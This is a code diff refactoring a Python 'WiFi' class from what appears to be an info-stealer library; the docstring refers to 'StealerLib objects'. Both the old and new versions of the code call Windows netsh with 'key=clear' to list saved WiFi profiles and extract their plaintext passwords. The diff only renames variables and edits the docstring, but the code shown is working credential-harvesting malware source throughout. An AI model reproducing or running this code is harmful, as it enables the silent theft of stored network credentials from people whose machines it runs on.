@@ -19,9 +19,9 @@ class WiFi:
     """This class provides methods for extracting and parsing information from connected WiFi stations
 
     Attributes:
-        ssids           List of Parsed WiFi SSID's
-        passwords       List of Parsed WiFi Passwords
-        credentials     A list of tuples containing the WiFi's SSID and password (if parsed)
+        ssids           A list of Parsed WiFi SSID's
+        passwords       A list of Parsed WiFi Passwords
+        credentials     A list of tuples (or StealerLib objects) containing the WiFi's SSID and password (if parsed)
     """
 
     def __init__(self):
@@ -37,12 +37,12 @@ class WiFi:
             list: A list of all available WiFi profile names
         """
 
-        command_arguments = ['netsh', 'wlan', 'show', 'profiles']
-        command_data = subprocess.check_output(command_arguments)
-        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')
+        args = ['netsh', 'wlan', 'show', 'profiles']
+        data = subprocess.check_output(args)
+        data = data.decode('utf-8', errors="backslashreplace").split('\n')
 
         profiles = [
-            p.split(":")[1][1:-1] for p in command_data if "All User Profile" in p
+            row.split(":")[1][1:-1] for row in data if "All User Profile" in row
         ]
 
         return profiles
@@ -58,15 +58,15 @@ class WiFi:
             list: A list of the profile information
         """
 
-        command_arguments = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
-        command_data = subprocess.check_output(command_arguments)
-        command_data = command_data.decode('utf-8', errors="backslashreplace").split('\n')
+        args = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
+        data = subprocess.check_output(args)
+        data = data.decode('utf-8', errors="backslashreplace").split('\n')
 
-        info = [
-            p.split(":")[1][1:-1] for p in command_data if "Key Content" in p
+        content = [
+            row.split(":")[1][1:-1] for row in data if "Key Content" in row
         ]
 
-        return info
+        return content
 
     @catch
     def get_wifi_passwords(
